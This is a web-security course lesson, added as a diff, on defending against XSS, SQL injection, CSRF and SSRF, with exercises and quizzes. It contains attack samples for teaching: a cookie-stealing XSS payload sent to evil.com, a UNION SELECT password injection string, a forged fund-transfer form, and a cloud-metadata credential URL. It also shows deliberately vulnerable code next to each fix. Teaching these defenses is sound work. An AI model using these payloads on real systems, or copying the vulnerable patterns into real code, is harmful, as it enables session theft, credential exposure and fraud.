@@ -1,0 +1,324 @@
+---
+title: "Input Validation and Defense in Depth"
+description: "Defend against XSS, SQL injection, CSRF, and SSRF by validating, sanitizing, and escaping all untrusted input at every layer."
+phase: 8
+module: "8-4-security"
+order: 4
+estimatedMinutes: 12
+difficulty: "advanced"
+standards:
+  cs2023: ["SE-4"]
+  swebok: ["Software Quality"]
+  bloom: "analyze"
+  sfia: 5
+  dreyfus: "proficient"
+vocabulary:
+  - xss
+  - sql-injection
+  - csrf
+  - ssrf
+  - sanitization
+  - escaping
+  - content-security-policy
+  - defense-in-depth
+---
+
+## Why this matters
+
+Every input your application receives — form fields, URL parameters, headers, file uploads, webhook payloads — is a potential attack vector. Cross-site scripting (XSS) alone accounts for roughly a third of all web vulnerabilities reported each year. The defense is not a single check at the front door. It is layers of validation, sanitization, and escaping at every boundary where data flows from untrusted to trusted context.
+
+## Cross-Site Scripting (XSS)
+
+XSS happens when an attacker injects malicious scripts that execute in another user's browser. Three types exist: reflected (in the URL), stored (in the database), and DOM-based (client-side manipulation).
+
+```javascript
+// STORED XSS — attacker submits a comment containing a script
+// The comment is saved to the database and rendered for all users
+const comment =
+  "<img src=x onerror=\"document.location='https://evil.com/steal?cookie='+document.cookie\">";
+
+// VULNERABLE — inserting raw HTML into the page
+element.innerHTML = comment; // Script executes!
+
+// FIX 1 — use textContent instead of innerHTML
+element.textContent = comment; // Renders as visible text, not HTML
+
+// FIX 2 — sanitize HTML when you need to allow some formatting
+// Using DOMPurify (a well-tested sanitization library)
+const DOMPurify = require("dompurify");
+const clean = DOMPurify.sanitize(comment, {
+  ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
+  ALLOWED_ATTR: ["href"],
+});
+element.innerHTML = clean; // Script tags and event handlers stripped
+
+// FIX 3 — Content Security Policy header (defense in depth)
+// Prevents inline scripts from executing even if XSS succeeds
+// Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+## SQL Injection
+
+SQL injection lets attackers modify database queries by injecting SQL syntax through user input. Parameterized queries are the primary defense.
+
+```javascript
+// VULNERABLE — string interpolation builds the query
+async function searchUsers(req, res) {
+  const { name } = req.query;
+  // Attacker sends: ?name=' UNION SELECT password FROM users --
+  const result = await db.query(`SELECT id, name, email FROM users WHERE name LIKE '%${name}%'`);
+  res.json(result.rows);
+}
+
+// FIXED — parameterized query (the database driver escapes the value)
+async function searchUsers(req, res) {
+  const { name } = req.query;
+  const result = await db.query("SELECT id, name, email FROM users WHERE name LIKE $1", [
+    `%${name}%`,
+  ]);
+  res.json(result.rows);
+}
+
+// EVEN BETTER — validate input shape before it reaches the query
+const { z } = require("zod");
+
+const SearchSchema = z.object({
+  name: z
+    .string()
+    .min(1)
+    .max(100)
+    .regex(/^[a-zA-Z0-9\s-]+$/),
+});
+
+async function searchUsers(req, res) {
+  const parsed = SearchSchema.safeParse(req.query);
+  if (!parsed.success) {
+    return res.status(400).json({ error: "Invalid search input" });
+  }
+  const result = await db.query("SELECT id, name, email FROM users WHERE name LIKE $1", [
+    `%${parsed.data.name}%`,
+  ]);
+  res.json(result.rows);
+}
+```
+
+## Cross-Site Request Forgery (CSRF)
+
+CSRF tricks a user's browser into making requests to your app while they are authenticated. The browser automatically includes cookies, so the server cannot distinguish a legitimate request from a forged one.
+
+```javascript
+// The attack: a malicious site includes this form
+// <form action="https://bank.com/transfer" method="POST">
+//   <input name="to" value="attacker-account" />
+//   <input name="amount" value="10000" />
+// </form>
+// <script>document.forms[0].submit();</script>
+
+// DEFENSE 1 — SameSite cookies (prevents cross-origin cookie sending)
+res.cookie("session", token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: "strict", // Cookie not sent on cross-origin requests
+});
+
+// DEFENSE 2 — CSRF tokens (defense in depth)
+const crypto = require("crypto");
+
+function generateCSRFToken(session) {
+  const token = crypto.randomBytes(32).toString("hex");
+  session.csrfToken = token;
+  return token;
+}
+
+function validateCSRFToken(req, res, next) {
+  const token = req.headers["x-csrf-token"] || req.body._csrf;
+  if (!token || token !== req.session.csrfToken) {
+    return res.status(403).json({ error: "Invalid CSRF token" });
+  }
+  next();
+}
+
+// Include the token in forms and AJAX headers
+// <input type="hidden" name="_csrf" value="{{csrfToken}}" />
+// fetch('/api/transfer', { headers: { 'X-CSRF-Token': csrfToken } })
+```
+
+## Server-Side Request Forgery (SSRF)
+
+SSRF tricks the server into making requests to internal resources. Cloud metadata endpoints are a high-value target.
+
+```javascript
+// VULNERABLE — server fetches any user-supplied URL
+app.post("/fetch-preview", async (req, res) => {
+  const response = await fetch(req.body.url);
+  const data = await response.text();
+  res.json({ preview: data });
+});
+// Attacker fetches: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+// FIXED — validate URL against allowlist and block internal ranges
+const { URL } = require("url");
+const net = require("net");
+
+function isInternalIP(hostname) {
+  // Block private IP ranges, localhost, link-local, metadata endpoints
+  const blocked = [
+    /^127\./,
+    /^10\./,
+    /^172\.(1[6-9]|2\d|3[01])\./,
+    /^192\.168\./,
+    /^169\.254\./,
+    /^0\./,
+    /^localhost$/i,
+    /^::1$/,
+    /^\[::1\]$/,
+  ];
+  return blocked.some((pattern) => pattern.test(hostname));
+}
+
+async function safeFetch(urlString) {
+  const url = new URL(urlString);
+
+  if (!["http:", "https:"].includes(url.protocol)) {
+    throw new Error("Only HTTP(S) URLs are allowed");
+  }
+
+  if (isInternalIP(url.hostname)) {
+    throw new Error("Internal URLs are not allowed");
+  }
+
+  // Resolve DNS to check the actual IP (prevent DNS rebinding)
+  const { address } = await require("dns").promises.lookup(url.hostname);
+  if (isInternalIP(address)) {
+    throw new Error("URL resolves to internal IP");
+  }
+
+  return fetch(url.toString(), { redirect: "manual" }); // Prevent redirect to internal
+}
+```
+
+## Defense in depth — layered validation
+
+No single defense is sufficient. Stack protections at every layer.
+
+```javascript
+// Layer 1: Schema validation at the API boundary
+const CommentSchema = z.object({
+  body: z.string().min(1).max(5000),
+  articleId: z.string().uuid(),
+});
+
+// Layer 2: Parameterized database queries
+async function createComment(data) {
+  return db.query("INSERT INTO comments (body, article_id, user_id) VALUES ($1, $2, $3)", [
+    data.body,
+    data.articleId,
+    data.userId,
+  ]);
+}
+
+// Layer 3: Output encoding when rendering
+function renderComment(comment) {
+  // Framework handles escaping (React, Next.js do this automatically)
+  // If using raw HTML, escape explicitly
+  return escapeHtml(comment.body);
+}
+
+// Layer 4: Content Security Policy headers
+// next.config.ts
+const securityHeaders = [
+  {
+    key: "Content-Security-Policy",
+    value:
+      "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:",
+  },
+  { key: "X-Content-Type-Options", value: "nosniff" },
+  { key: "X-Frame-Options", value: "DENY" },
+  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+];
+
+// Layer 5: Row Level Security in the database
+// Even if application code has a bug, the database blocks unauthorized access
+```
+
+## Try it
+
+<SandboxExercise language="javascript">
+{`// Build an input validator that defends against multiple attack vectors.
+// Implement each function to return { valid: true, clean: value }
+// or { valid: false, error: "reason" }.
+
+function validateUsername(input) {
+// Allow only alphanumeric, underscore, hyphen
+// Length: 3-30 characters
+// Must start with a letter
+}
+
+function validateEmail(input) {
+// Basic email format validation
+// Reject if it contains HTML tags or SQL keywords
+}
+
+function validateURL(input) {
+// Only allow http and https protocols
+// Block internal IP ranges (127.x, 10.x, 192.168.x, 169.254.x)
+// Return the parsed URL if valid
+}
+
+function sanitizeHTML(input) {
+// Strip all HTML tags except <b>, <i>, <em>, <strong>
+// Remove all attributes from allowed tags
+// Return the sanitized string
+}
+
+// Tests
+console.log(validateUsername("alice_99").valid === true);
+console.log(validateUsername("<script>").valid === false);
+console.log(validateUsername("ab").valid === false);
+
+console.log(validateEmail("user@example.com").valid === true);
+console.log(validateEmail("user@ex<script>ample.com").valid === false);
+
+console.log(validateURL("https://example.com").valid === true);
+console.log(validateURL("http://169.254.169.254").valid === false);
+
+console.log(sanitizeHTML("<b>bold</b><script>alert(1)</script>").clean === "<b>bold</b>");`}
+
+</SandboxExercise>
+
+## Check your understanding
+
+<Quiz
+  question="Why is parameterized querying the primary defense against SQL injection?"
+  options={[
+    "It encrypts the SQL query before sending it",
+    "It escapes special characters in the query string",
+    "It separates the query structure from user data so the database never interprets input as SQL",
+    "It limits the number of results returned",
+  ]}
+  answer={2}
+  explanation="Parameterized queries send the SQL structure and user values separately. The database engine treats parameters as data, never as executable SQL, making injection structurally impossible."
+/>
+
+<Quiz
+  question="Which combination provides the strongest defense against XSS?"
+  options={[
+    "Input validation alone",
+    "Output encoding alone",
+    "Input validation + output encoding + Content Security Policy",
+    "A Web Application Firewall (WAF) alone",
+  ]}
+  answer={2}
+  explanation="Defense in depth: input validation rejects malicious data early, output encoding prevents execution at render time, and CSP blocks inline scripts even if the other layers fail."
+/>
+
+<FillBlank
+  question="A ______ attack tricks a user's browser into making authenticated requests to your application from a malicious site."
+  answer="CSRF"
+/>
+
+## What you learned
+
+- XSS, SQL injection, CSRF, and SSRF each exploit different trust boundaries, and each requires targeted defenses — there is no single fix
+- Defense in depth means stacking protections at every layer: schema validation, parameterized queries, output encoding, CSP headers, and database-level policies
+- Input validation should happen at the boundary (reject bad data early) and output encoding at the render layer (escape data for its context)
